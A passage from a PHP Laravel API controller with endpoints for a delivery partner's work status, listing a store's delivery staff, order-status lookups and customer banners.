                $response = ['success' => true, 'message' => 'Detail Saved Successfully.', 'user' => $user];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }
    public function currentWorkStatusUpdate(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'current_work_status' => 'required|in:0,1',
            ];

            $messages = [
                'current_work_status.in' => 'The current work status must be either 1 (Online) or 0 (Offline).',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules, $messages);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $user = Auth::user();

                $conditions = [
                    "user_id" => $user->id,
                ];
                $data = [
                    'current_work_status' => $request->current_work_status
                ];
                $save = DeliveryPartners::updateOrCreate($conditions, $data);

                DB::commit();

                $user['delivery_boy_detail'] = $save;

                $response = ['success' => true, 'message' => 'Work Status Updated.', 'user' => $user];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }
    public function getMyDeliveryBoys(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'store_id' => 'required|exists:stores,id|numeric',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $delivery_boys = User::where('store_id', $request->store_id)->where('role_type', 5)->get();
                DB::commit();
                $response = ['success' => true, 'message' => 'Delivery Boys Detail' , 'delivery_boys' => $delivery_boys];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }
    public function getAllDPOrderStatus(Request $request)
    {
        $DPOrderStatus = DPOrderStatus::all();

        $response = ['success' => true, 'message' => 'Delivery Boys Detail' , 'DPOrderStatus' => $DPOrderStatus];

        return Response::json($response, 200);
    }
    public function getAllMerchantOrderStatus(Request $request)
    {
        $MerchantOrderStatus = MerchantOrderStatus::all();

        $response = ['success' => true, 'message' => 'Delivery Boys Detail' , 'MerchantOrderStatus' => $MerchantOrderStatus];

        return Response::json($response, 200);
    }

    public function customerBanners(Request $request)
    {
        $rules = [
            'module_id' => 'required',
            'category_id' => 'required',
        ];
        $requestData = $request->all();
        $validator = Validator::make($requestData, $rules);
        $getCustomerBanners = CustomerBanner::where(['module_id'=>$request->module_id,'category_id'=>$request->category_id])->get();
        $response = ['success' => true, 'message' => 'Customer Banners' , 'getCustomerBanners' => $getCustomerBanners];
        return Response::json($response, 200);

    }
}
